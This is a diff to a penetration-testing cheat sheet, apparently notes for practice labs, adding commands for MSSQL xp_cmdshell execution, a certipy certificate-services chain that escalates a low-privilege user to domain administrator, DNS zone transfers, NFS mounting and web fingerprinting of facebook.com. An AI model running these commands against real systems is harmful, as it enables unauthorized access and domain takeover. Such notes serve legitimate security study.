@@ -13,9 +13,11 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [whatweb](#whatweb)
   - [ntpdate](#ntpdate)
   - [MYSQL](#mysql)
   - [MSSQL](#mssql)
+  - [certipy](#certipy)
   - [netexec](#netexec)
   - [Nslookup](#nslookup)
   - [Dig](#dig)
@@ -74,6 +76,7 @@
   - [Directory Traversal](#directory-traversal)
   - [Local File Inclusion](#local-file-inclusion)
   - [PHP File Upload Bypass](#php-file-upload-bypass)
+- [NFS](#nfs)
 - [SMB](#smb)
 - [FTP](#ftp)
 - [Active Directory](#active-directory)
@@ -455,6 +458,13 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -
 ```
 
 ## Tools
+### whatweb
+```bash
+whatweb -a3 https://www.facebook.com -v
+
+```
+
+
 ### ntpdate
 ```bash
 sudo ntpdate 10.10.x.x
@@ -478,6 +488,38 @@ mysql -u root -pP4SSw0rd -h 10.129.14.128
 ```bash
 python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
 select name from sys.databases
+
+# try xp_cmdshell
+> xp_cmdshell whoami
+> enable_xp_cmdshell
+
+# try xp_dirtree
+> xp_dirtree c:\
+> xp_dirtree c:\inetpub\wwwroot
+> 
+```
+
+### certipy (https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
+```bash
+certipy find -u raven -p password -dc-ip 10.x.x.x -stdout -vulnerable
+
+certipy ca -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -add-officer raven
+
+# use subca(but we can list which templates are available)
+(certipy ca -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -list-templates)
+certipy ca -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -enbable-template subca
+
+# upn will set to administrator
+certipy req -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
+
+# force request
+certipy ca -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -issue-request 13
+
+# retrieve
+certipy req -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -retrieve 13
+
+# use certificate
+certipy auth -pfx administrator.pfx
 ```
 
 ### netexec
@@ -501,19 +543,45 @@ netexec smb 10.x.x.x -u 'operator' -p 'operator' --shares
 
 ### Nslookup
 ```bash
+#A Records
 nslookup $TARGET
 nslookup -query=A $TARGET
 
+#PTR Records for an IP Address
+nslookup -query=PTR 31.13.92.36
+
+#ANY Existing Records
+nslookup -query=ANY $TARGET
+
+#TXT Records
+nslookup -query=TXT $TARGET
+
+#MX Records
+nslookup -query=MX $TARGET
 ```
 
 ### dig
 ```bash
+#A Records
 dig facebook.com @1.1.1.1
 dig a www.facebook.com @1.1.1.1
+
+# PTR record
+dig -x 31.13.92.36 @1.1.1.1
+
+#ANY Existing Records
+dig any inlanefreight.htb @10.129.14.128
+
+#TXT Records
+dig CH TXT version.bind 10.129.120.85
+
+#MX Records
+dig mx facebook.com @1.1.1.1
+
 dig soa www.inlanefreight.com
 dig ns inlanefreight.htb @10.129.14.128
-dig CH TXT version.bind 10.129.120.85
-dig any inlanefreight.htb @10.129.14.128
+
+
 dig axfr inlanefreight.htb @10.129.14.128
 dig axfr internal.inlanefreight.htb @10.129.14.128
 
@@ -1404,6 +1472,24 @@ echo -n 'tacos123' | sha1sum
 echo -n 'tacos123' | sha256sum 
 ```
 
+# nfs 
+```bash
+# footprinting with nmap
+sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
+
+# showmount
+showmount -e 10.129.14.128
+
+# mount nfs
+mkdir target-NFS
+sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
+cd target-NFS
+tree .
+
+# unmount
+sudo umount ./target-NFS
+```
+
 
 # SMB
 ```bash
@@ -1417,7 +1503,7 @@ sudo systemctl restart smbd
 
 ==================================================================================================
 
-# nmap
+# footprinting with nmap
 nmap 10.10.10.175 --script=smb-enum* -p445
 sudo nmap 10.129.14.128 -sV -sC -p139,445
 
@@ -1425,7 +1511,6 @@ sudo nmap 10.129.14.128 -sV -sC -p139,445
 
 # smbclient
 ## Even when it says the user can only read, TRY uploading something anyway!
-
 ## anon
 smbclient -L 10.10.10.175 -N
 smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
@@ -1473,7 +1558,6 @@ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(p
 
 # Impacket - Samrdump.py
 samrdump.py 10.129.14.128
-
 
 ==================================================================================================
 
